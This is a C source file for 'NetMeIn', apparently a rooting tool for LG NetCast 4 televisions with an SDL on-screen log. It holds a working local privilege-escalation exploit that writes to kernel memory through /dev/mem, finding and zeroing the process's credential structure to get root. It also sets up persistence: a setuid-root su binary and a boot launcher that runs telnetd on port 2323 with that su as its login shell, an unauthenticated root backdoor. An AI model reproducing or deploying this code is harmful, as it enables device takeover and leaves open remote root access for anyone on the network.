/*
 * NetMeIn for LG NetCast 4 (SDL GUI + debug log).
 *
 * Uses SDL2 built with the nc4 video driver (registered with the app manager,
 * started via "nc4app run netmein/netmein").  Scans /dev/mem for struct cred
 * matching our uid/gid, zeroes it => root.  On success: installs setuid su,
 * writes extra_conf launcher, logs a 5-second reboot countdown and reboots.
 * All logging goes through nc4log (stderr + <prog>.log) because stdout is
 * not usable under the app manager.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/reboot.h>
#include <errno.h>

#include <SDL.h>

#include "nc4log.h"
#include "font8x8_basic.h"

#define SU_PATH   "/home/su"

/* embedded setuid "su" binary (su_blob.o), linked -Bsymbolic style */
extern const unsigned char _binary__tmp_su_start[];
extern const unsigned char _binary__tmp_su_end[];
#define LAUNCHER  "/mnt/cache/browser/extra_conf"
#define WIN_W     1280
#define WIN_H     720

/* ---- GUI state ---- */
static SDL_Window *window;
static SDL_Renderer *renderer;

/* ---- exploit state ---- */
static unsigned int our_uid, our_gid;

/* 8x8 basic font (public domain, 128 chars) from font8x8_basic.h */
static const unsigned char (*font8x8)[8] = font8x8_basic;

/* scale: draw each 8x8 glyph pixel as a SCALE x SCALE block -> bigger text */
#define FONT_SCALE 2

/* draw a single line of text on the software renderer via a temp surface */
static void draw_text(int x, int y, const char *s, Uint8 r, Uint8 g, Uint8 b)
{
    SDL_Surface *tmp = SDL_CreateRGBSurface(0, WIN_W, WIN_H, 32,
                                            0x00ff0000, 0x0000ff00, 0x000000ff, 0xff000000);
    if (!tmp) return;
    SDL_RenderReadPixels(renderer, NULL, SDL_PIXELFORMAT_ARGB8888,
                         tmp->pixels, tmp->pitch);
    Uint32 *px = tmp->pixels;
    Uint32 col = SDL_MapRGB(tmp->format, r, g, b);
    for (; *s; s++) {
        int idx = (unsigned char)*s - 32;   /* font8x8_basic[0]=space(0x20) */
        if (idx < 0 || idx > 95) idx = 0;
        const unsigned char *glyph = font8x8[idx];
        int sx = x;
        for (int row = 0; row < 8; row++) {
            unsigned char line = glyph[row];
            /* font8x8_basic: bit 0 (LSB) is the leftmost column */
            for (int bit = 0; bit < 8; bit++) {
                if (line & (1 << bit)) {
                    /* fill a FONT_SCALE x FONT_SCALE block */
                    for (int dy = 0; dy < FONT_SCALE; dy++) {
                        int py = y + row * FONT_SCALE + dy;
                        if (py < 0 || py >= WIN_H) continue;
                        for (int dx = 0; dx < FONT_SCALE; dx++) {
                            int px2 = sx + bit * FONT_SCALE + dx;
                            if (px2 >= 0 && px2 < WIN_W)
                                px[py * WIN_W + px2] = col;
                        }
                    }
                }
            }
        }
        x += 8 * FONT_SCALE + 1;  /* 8 cols * scale + 1px spacing */
    }
    SDL_Texture *tex = SDL_CreateTextureFromSurface(renderer, tmp);
    if (tex) { SDL_RenderCopy(renderer, tex, NULL, NULL); SDL_DestroyTexture(tex); }
    SDL_FreeSurface(tmp);
}

static int lines_count = 0;
static char lines[32][256];

static void ui_log(const char *fmt, ...)
{
    char b[256];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    nc4log("%s", b); /* to stderr + logfile */
    if (lines_count < 32) {
        snprintf(lines[lines_count], 256, "%s", b);
        lines_count++;
    }
}

static void ui_redraw(void)
{
    SDL_SetRenderDrawColor(renderer, 10, 10, 18, 255);
    SDL_RenderClear(renderer);
    int y = 8;
    int step = 8 * FONT_SCALE + 2;
    for (int i = 0; i < lines_count && y < WIN_H - 4; i++) {
        draw_text(8, y, lines[i], 0x50, 0xff, 0x50);
        y += step;
    }
    SDL_RenderPresent(renderer);
}

/* ---- exploit ---- */
static int is_our_cred(const unsigned char *r)
{
    for (int i = 0; i < 6; i++) {
        unsigned int w = r[i*4] | (r[i*4+1] << 8) | (r[i*4+2] << 16) | (r[i*4+3] << 24);
        unsigned int want = (i & 1) ? our_gid : our_uid;
        if (w != want) return 0;
    }
    return 1;
}

static void write_launcher(void)
{
    const char *sh = "#!/bin/sh\n/usr/sbin/telnetd -p 2323 -l " SU_PATH " &\n";
    int f = open(LAUNCHER, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (f < 0) { ui_log("open %s: %s", LAUNCHER, strerror(errno)); ui_redraw(); return; }
    (void)write(f, sh, strlen(sh));
    close(f);
    ui_log("wrote %s", LAUNCHER);
    ui_redraw();
}

static void setup_persist(void)
{
    /* write embedded setuid-root su binary to /home/su */
    size_t sz = (size_t)(_binary__tmp_su_end - _binary__tmp_su_start);
    int out = open(SU_PATH, O_WRONLY | O_CREAT | O_TRUNC, 04755);
    if (out < 0) { ui_log("open %s: %s", SU_PATH, strerror(errno)); ui_redraw(); }
    else {
        size_t off = 0;
        while (off < sz) {
            ssize_t w = write(out, _binary__tmp_su_start + off, sz - off);
            if (w <= 0) break;
            off += (size_t)w;
        }
        close(out);
        if (chmod(SU_PATH, 04755) != 0)
            ui_log("chmod %s: %s", SU_PATH, strerror(errno));
        else
            ui_log("installed su (%u bytes, setuid 4755)", (unsigned)sz);
        ui_redraw();
    }
    /* auto-root telnetd launcher -> telnetd -l /home/su */
    write_launcher();
}

static void countdown_and_reboot(void)
{
    ui_log("ROOT achieved (uid=%u)!!", (unsigned)geteuid());
    ui_redraw();
    setup_persist();
    for (int c = 5; c > 0; c--) {
        ui_log("rebooting in %d...", c);
        ui_redraw();
        SDL_Delay(1000);
    }
    ui_log("REBOOTING now");
    ui_redraw();
    sync();
    reboot(RB_AUTOBOOT);
    system("/sbin/reboot -f");
    _exit(0);
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;
    nc4log_open(argv[0]);

    our_uid = (unsigned int)getuid();
    our_gid = (unsigned int)getgid();

    ui_log("NetMeIn: NetCast4 privilege escalation (GUI)");
    ui_log("uid=%u gid=%u", our_uid, our_gid);

    /* SDL init */
    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_EVENTS) != 0) {
        ui_log("SDL_Init: %s", SDL_GetError());
        return 1;
    }
    window = SDL_CreateWindow("NetMeIn", 0, 0, WIN_W, WIN_H, SDL_WINDOW_FULLSCREEN);
    if (!window) { ui_log("SDL_CreateWindow: %s", SDL_GetError()); SDL_Quit(); return 1; }
    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);
    if (!renderer) { ui_log("SDL_CreateRenderer: %s", SDL_GetError()); SDL_Quit(); return 1; }

    ui_log("video driver: %s", SDL_GetCurrentVideoDriver());
    ui_redraw();

    /* drain events, keep GUI responsive */
    SDL_Event ev;
    while (SDL_PollEvent(&ev)) {}

    if (geteuid() == 0) {
        /* invoked as telnetd login shell via setuid /home/su ->
           spawn a clean interactive root shell */
        ui_log("already root, spawning shell");
        ui_redraw();
        SDL_DestroyRenderer(renderer);
        SDL_DestroyWindow(window);
        SDL_Quit();
        execl("/bin/sh", "sh", "-i", (char *)0);
        execl("/bin/busybox", "sh", "-i", (char *)0);
        _exit(127);
    }

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) { ui_log("open /dev/mem: %s", strerror(errno)); ui_redraw(); goto done; }
    FILE *iomem = fopen("/proc/iomem", "r");
    if (!iomem) { ui_log("open /proc/iomem: %s", strerror(errno)); ui_redraw(); close(fd); goto done; }

    char line[256];
    int found = 0;
    while (fgets(line, sizeof(line), iomem)) {
        unsigned long start, end;
        char name[64];
        if (sscanf(line, "%lx-%lx : %63[^\n]", &start, &end, name) == 3 &&
            strstr(name, "System RAM")) {
            off_t len = (off_t)(end - start + 1);
            unsigned char *map = mmap(NULL, (size_t)len, PROT_READ | PROT_WRITE,
                                      MAP_SHARED, fd, (off_t)start);
            if (map == MAP_FAILED) {
                ui_log("mmap %lx-%lx: %s", start, end, strerror(errno));
                ui_redraw();
                continue;
            }
            ui_log("scan %lx-%lx (%u KB)", start, end, (unsigned)(((unsigned long)len)/1024));
            ui_redraw();
            while (SDL_PollEvent(&ev)) {}

            for (size_t i = 0; i + 32 < (size_t)len; i += 4) {
                const unsigned char *c = map + i;
                unsigned int w32 = c[32] | (c[33] << 8) | (c[34] << 16) | (c[35] << 24);
                unsigned int w36 = c[36] | (c[37] << 8) | (c[38] << 16) | (c[39] << 24);
                if (is_our_cred(c) && w32 != 0xCABABBE0u && w36 != 0xCAFFEEF1u) {
                    memset((void *)c, 0, 32);
                    ui_log("patched cred @ %lx", start + i);
                    ui_redraw();
                    if (getuid() == 0 && getgid() == 0) { found = 1; break; }
                }
            }
            munmap(map, (size_t)len);
            if (found) break;
            ui_log("pass done, not root yet");
            ui_redraw();
        }
    }
    fclose(iomem);
    close(fd);

    if (found)
        countdown_and_reboot();

done:
    ui_log("FAILED, no root found");
    ui_redraw();
    SDL_Delay(5000);
    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();
    return 1;
}